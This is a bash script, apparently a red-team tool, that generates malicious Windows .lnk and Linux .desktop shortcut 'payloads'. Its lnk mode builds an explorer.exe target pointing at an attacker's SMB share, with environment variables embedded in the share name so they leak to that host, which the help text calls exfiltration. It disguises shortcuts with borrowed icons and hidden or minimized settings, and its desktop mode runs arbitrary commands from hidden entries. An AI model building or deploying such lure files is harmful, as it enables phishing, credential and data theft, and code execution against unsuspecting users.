#!/usr/bin/env bash

: <<-'COMMENT'
Immediately enable "strict mode" so that:
    - any unbound variable causes an error (-u)
    - any failed command causes an exit (-e)
    - any failure in a pipeline causes the pipeline to fail (-o pipefail)
COMMENT
set -euo pipefail

# Set the WINEPREFIX_DIRECTORY to the user's home directory
WINEPREFIX_DIRECTORY="${HOME}/.wine"

# Initialize variables to avoid unbound errors under strict mode:
VERSION=
ARGUMENTS=""
COMMAND=""
IP=""
ENVIRONMENT=""
SHARE=""
NAME=""
DESCRIPTION=""
ICON=""
WINDOW=""
WORKINGDIRECTORY=""
OUTPUT=""
PAYLOAD=""

function print() {
    local status="${1}"
    local message="${2}"
    local color

    case "${status}" in
        information) color="\033[1;34m[*]\033[0m" ;;    # Bold Blue
        completed) color="\033[1;32m[+]\033[0m" ;;      # Bold Green
        error) color="\033[1;31m[-]\033[0m" ;;          # Bold Red
    esac

    echo -e "${color} ${message}"
}

function quit() {
    print "information" "Terminating program..."
    exit "${1}"
}

function check_program() {
    type -P "${1}" 2>/dev/null
}

function check_dependencies() {
    local -a programs=("getopt" "wine" "desktop-file-edit")
    local -a missing=()
    local -a powershell=("${WINEPREFIX_DIRECTORY}/drive_c/Program Files/PowerShell/"*/pwsh.exe)

    if [[ ! -d "${WINEPREFIX_DIRECTORY}" ]]
    then
        print "error" "Directory not found: ${WINEPREFIX_DIRECTORY}. WINEPREFIX directory has not been initialized!"
        quit 1
    fi

    for program in "${programs[@]}"
    do
        if [[ -z $(check_program "${program}") ]]
        then
            if [[ "${program}" == "getopt" ]]
            then
                missing+=("util-linux")
            elif [[ "${program}" == "desktop-file-edit" ]]
            then
                missing+=("desktop-file-utils")
            else
                missing+=("${program}")
            fi
        fi
    done

    shopt -s nullglob
    [[ ! -f "${powershell[0]}" ]] && missing+=("powershell")
    shopt -u nullglob

    if ((${#missing[@]} > 0))
    then
        print "error" "Required dependencies: ${missing[*]}"
        quit 1
    fi
}

function random_string() {
    local -a characters=({a..z} {A..Z})
    local length=$((RANDOM % 11 + 6))  # A length of characters between 6 and 16
    local string=""
    local random_index

    for ((i = 0; i < length; i++))
    do
        random_index=$((RANDOM % ${#characters[@]}))
        string+=${characters[$random_index]}
    done

    echo "${string}"
}

function generate() {
    local payload="${1}"
    local command="${COMMAND//\\/\\\\}"
    local arguments="${ARGUMENTS//\\/\\\\}"
    local name="${NAME//\\/\\\\}"
    local description="${DESCRIPTION//\\/\\\\}"
    local -a execute=()

    function shell_link() {
        local -A windowstyle=(
            [normal]=1
            [maximized]=3
            [minimized]=7
        )
        local temp
        local temporary_file
        local script
        execute=("WINEDEBUG=-all" "WINEARCH=win64"
                "WINEPREFIX='${WINEPREFIX_DIRECTORY}'" "wine")

        script="\$WScriptShell = New-Object -ComObject WScript.Shell\n"
        script+="\$ShortcutPath = \"${OUTPUT}\"\n"
        script+="\$Shortcut = \$WScriptShell.CreateShortcut(\$ShortcutPath)\n"

        if [[ -n "${command}" ]]
        then
            if [[ -n "${arguments}" && "${#arguments}" -lt 260 ]]
            then
                script+="\$Shortcut.TargetPath = '${command}'\n"
                script+="\$Shortcut.Arguments = '${arguments}'\n"
            elif (("${#arguments}" >= 260))
            then
                print "error" "Arguments must not exceed more than 260 characters"
                quit 1
            elif [[ -z "${arguments}" ]]
            then
                print "error" "Command and arguments must be passed!"
                quit 1
            fi
        elif [[ -n "${IP}" ]] # check if IP is passed if command is not passed
        then
            local unc
            if [[ -z "${SHARE}" ]]
            then
                SHARE="$(random_string)"
                if [[ -n "${ENVIRONMENT}" ]]
                then
                    while IFS="," read -ra variables
                    do
                        for variable in "${variables[@]}"
                        do
                            temp+="%${variable}%,"
                        done
                    done <<< "${ENVIRONMENT}"
                    # Remove trailing comma
                    ENVIRONMENT="${temp%,}"
                    SHARE="${SHARE}_${ENVIRONMENT}"
                fi

                if [[ -z "${NAME}" ]]
                then
                    unc="\\\\\\${IP}\\\\${SHARE}"
                elif [[ -n "${NAME}" ]]
                then
                    unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
                fi
            elif [[ -n "${SHARE}" ]]
            then
                if [[ -z "${NAME}" ]]
                then
                    unc="\\\\\\${IP}\\\\${SHARE}"
                elif [[ -n "${NAME}" ]]
                then
                    unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
                fi
            fi

            # Escape the escape character (\e)
            script+="\$Shortcut.TargetPath = 'C:\\Windows\\\\explorer.exe'\n"
            script+="\$Shortcut.Arguments = '/root,\"\\${unc}\"'\n"
        else
            print "error" "You must provide either -c (command) or -i (IP) for 'lnk' payload."
            quit 1
        fi

        if [[ -n "${description}" ]]
        then
            script+="\$Shortcut.Description = \"${description}\""
        fi

        # Using a custom index icon
        if [[ -n "${ICON}" ]]
        then
            script+="\$Shortcut.IconLocation = '${ICON}'\n"
        elif [[ -z "${ICON}" ]] # Will set to control panel icon by default
        then
            script+="\$Shortcut.IconLocation = 'shell32.dll,21'\n"
        fi

        if [[ -n "${WINDOW}" ]]
        then
            if [[ -z "${windowstyle[${WINDOW}]+_}" ]]
            then
                print "error" "Invalid window style: ${WINDOW}"
                quit 1
            fi
            script+="\$Shortcut.WindowStyle = ${windowstyle[${WINDOW}]}\n"
        fi

        if [[ -n "${WORKINGDIRECTORY}" ]]
        then
            script+="\$Shortcut.WorkingDirectory = '${WORKINGDIRECTORY}'\n"
        fi

        script+="\$Shortcut.Save()\n"

        # Save the temporary PowerShell script then remove it after generation
        temporary_file=$(mktemp --suffix '.ps1')
        echo -e "${script}" > "${temporary_file}"
        eval "${execute[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file} 2>/dev/null"
        rm -f "${temporary_file}"

        print "completed" "Payload has been generated!"
    }

    function desktop_entry() {
        execute=("desktop-file-edit")

        if [[ -n "${name}" ]]
        then
            execute+=("--set-key='Encoding'")
            execute+=("--set-value='UTF-8'")
            execute+=("--set-key='Name'")
            execute+=("--set-value='${name}'")
            execute+=("--set-key='Version'")
            execute+=("--set-value='1.0'")
        else
            print "error" "Name must be passed!"
            quit 1
        fi

        if [[ -n "${command}" && -n "${arguments}" ]]
        then
            if (("${#arguments}" >= 2090326))
            then
                print "error" "Arguments must not exceed more than 2090326 characters"
                quit 1
            fi
            execute+=("--set-key='Exec'")
            execute+=("--set-value='${command} ${arguments}'")
        elif [[ -n "${command}" ]]
        then
            execute+=("--set-key='Exec'")
            execute+=("--set-value='${command}'")
        else
            print "error" "At least command and/or arguments must be passed!"
            quit 1
        fi

        if [[ -n "${description}" ]]
        then
            execute+=("--set-comment='${description}'")
        fi

        if [[ -n "${WORKINGDIRECTORY}" ]]
        then
            execute+=("--set-key='Path'")
            execute+=("--set-value='${WORKINGDIRECTORY}'")
        fi

        if [[ -n "${ICON}" ]]
        then
            execute+=("--set-icon='${ICON}'")
        fi

        if [[ -z "${WINDOW}" ]]
        then
            execute+=("--set-key=\"Terminal\"")
            execute+=("--set-value=\"false\"")
        elif [[ -n "${WINDOW}" ]] # Make the application run in terminal if set to true otherwise false
        then
            if [[ "${WINDOW}" == "true" || "${WINDOW}" == "false" ]]
            then
                execute+=("--set-key=\"Terminal\"")
                execute+=("--set-value=\"${WINDOW}\"")
            else
                print "error" "The Terminal must be set either 'true' or 'false'!"
            fi
        fi
        execute+=("--set-key=\"Type\"")
        execute+=("--set-value=\"Application\"")
        # Do not appear in application menu
        execute+=("--set-key=\"NoDisplay\"")
        execute+=("--set-value=\"true\"")
        # The desktop entry must be usable and not hidden
        execute+=("--set-key=\"Hidden\"")
        execute+=("--set-value=\"false\"")
        execute+=("--remove-key=\"X-Desktop-File-Install-Version\"")
        touch "${OUTPUT}"

        print "completed" "Payload has been generated!"
        eval "${execute[*]} ${OUTPUT} &>/dev/null"
    }

    if [[ -f "${OUTPUT}" ]]
    then
        rm -f "${OUTPUT}"
    fi

    case "${payload}" in
        "lnk")
            shell_link
            ;;
        "desktop")
            desktop_entry
            ;;
        *)
            print "error" "Available payloads are: 'lnk' and 'desktop'!"
            quit 1
            ;;
        esac
}

function usage() {
    echo "Usage: $(basename ${0}) <flags>
Flags:
    -p, --payload                       Specify a payload module ('lnk', 'desktop').
    -c, --command                       Specify a command to execute.
    -a, --arguments                     Optionally pass the arguments (except it is
                                        mandatory for 'lnk' payload module).
    -i, --ip                            Specify an IP address/hostname (applies with
                                        'lnk' payload module).
    -e, --environment                   Optionally pass the environment variables to
                                        exfiltrate.
    -s, --share                         Specify an SMB share (applies with -h flag
                                        when it's optional for 'lnk' payload module).
    -n, --name                          Specify a name. It is optional when 'lnk'
                                        payload module is specified (applies with -h flag).
                                        For 'desktop' payload module it is mandatory.
    -d, --description                   Specify the description of the payload.
    --icon                              Specify a custom icon.
    -w, --window                        Specify a window. For 'lnk' payload windowstyle
                                        'normal' is set by default if not specified.
                                        The available windowstyles are: 'normal', 'maximized',
                                        and 'minimized'. For 'desktop' payload it is set to
                                        'false', the available options are: 'true' and 'false'.
    --workingdirectory                  Specify a working directory.
    -o, --output                        Specify an output.
    -v, --version                       Display the program's version number.
    -h, --help                          Display the help menu."

    exit 0
}

function main() {
    local directory

    local options="p:c:a:i:e:s:n:d:w:o:v:h"
    local long_options="payload:,command:,arguments:,ip:,environment:,share:,name:,description:,icon:,window:,workingdirectory:,output:,version:,help"
    local parsed_options=$(getopt -o "${options}" -l "${long_options}" -n "$(basename "${0}")" -- "${@}")

    if ((${?} != 0))
    then
        print "error" "Failed to parse options... Exiting." >&2
        quit 1
    fi

    eval set -- "${parsed_options}"

    while true
    do
        case "${1}" in
            -p | --payload)
                PAYLOAD="${2,,}"
                shift 2
                ;;
            -c | --command)
                COMMAND="${2}"
                shift 2
                ;;
            -a | --arguments)
                ARGUMENTS="${2}"
                shift 2
                ;;
            -i | --ip)
                IP="${2}"
                shift 2
                ;;
            -e | --environment)
                ENVIRONMENT="${2}"
                shift 2
                ;;
            -s | --share)
                SHARE="${2}"
                shift 2
                ;;
            -n | --name)
                NAME="${2}"
                shift 2
                ;;
            -d | --description)
                DESCRIPTION="${2}"
                shift 2
                ;;
            --icon)
                ICON="${2}"
                shift 2
                ;;
            -w | --window)
                WINDOW="${2,,}"
                shift 2
                ;;
            --workingdirectory)
                WORKINGDIRECTORY="${2}"
                shift 2
                ;;
            -o | --output)
                OUTPUT="${2}"
                shift 2
                ;;
            -v | --version)
                VERSION=1
                shift
                ;;
            -h | --help)
                usage
                ;;
            --)
                shift
                break
                ;;
            *)
                print "error" "Invalid option: ${1}" >&2
                quit 1
                ;;
        esac
    done

    trap quit SIGINT
    check_dependencies

    ((VERSION == 1)) && echo "${0} version: v1.2"

    # Require either -c or -i (but not both) for 'lnk' payloads
    if [[ "${PAYLOAD}" == "lnk" ]]
    then
        if [[ -n "${COMMAND}" && -n "${IP}" ]]
        then
            print "error" "Cannot use both -c (command) and -i (IP) together for 'lnk' payload. Choose one."
            quit 1
        elif [[ -z "${COMMAND}" && -z "${IP}" ]]
        then
            print "error" "You must provide either -c (command) or -i (IP) for 'lnk' payload."
            quit 1
        fi
    fi

    if [[ -n "${OUTPUT}" ]]
    then
        directory=$(dirname "${OUTPUT}")

        if [[ -d "${directory}" && -w "${directory}" ]]
        then
            generate "${PAYLOAD}"
        elif [[ ! -d "${directory}" ]]
        then
            print "error" "Directory path does not exist: ${directory}"
        elif [[ -d "${directory}" && ! -w "${directory}" ]]
        then
            print "error" "Permission denied: Cannot generate payload to directory path: ${directory}."
        fi
    else
        print "error" "Output file must be specified!"
        quit 1
    fi
}

main "${@}"
